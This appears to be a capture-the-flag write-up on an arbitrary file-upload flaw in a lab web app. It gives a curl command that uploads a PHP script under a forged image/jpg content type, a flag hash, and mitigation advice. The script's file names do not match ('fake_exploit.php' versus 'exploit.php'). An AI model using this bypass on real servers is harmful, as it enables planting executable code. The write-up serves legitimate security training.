# File upload


## Flag
```
46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```

## How to find it

- Upon examination of the website, it is found a button called ADD IMAGE that redirects to another page that allows to upload an image to the server. After several tries, it is found that only jpeg/jpg files are accepted (any other type file is rejected). The page address is the following:

    - `http://192.168.56.102/index.php?page=upload`

- Since only jpeg/jpg files are accepted, we try to infiltrate a malicious script disguised as a jpg file. For that purpose we create the following script which using the 'curl' command, uploads our malicious file disguised as a jpg file.

    ```shell
    touch fake_exploit.php
    curl -X POST -F "Upload=Upload" \
    -F "uploaded=@exploit.php;type=image/jpg" \
    "http://192.168.56.102/index.php?page=upload" | grep 'flag'
    rm fake_exploit.php
    ```

- Once the malicious file is uploaded, the flag is obtained.

## How to fix it

Three basic strategies to solve this type of breach would be:

1. **Strict File Type Validation:** Ensure that the server-side validation strictly checks the file type by inspecting the file's content (MIME type) rather than just the file extension. This helps prevent malicious files disguised with a different extension from being uploaded.

2. **Content Scanning:** Implement content scanning for uploaded files to detect and block potentially malicious content. Use antivirus or malware scanning tools to analyze the file content before accepting the upload.

3. **Limit File Permissions:** Store uploaded files in a directory with limited permissions and ensure that they are not executable. This prevents any uploaded scripts from being executed on the server, reducing the risk of code injection attacks.

## Resources

- [File Upload - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [🚨 Esta es la Principal VULNERABILIDAD de las PÁGINAS WEB | Arbitrary File Upload - YouTube](https://www.youtube.com/watch?v=_w-ktFZX9II)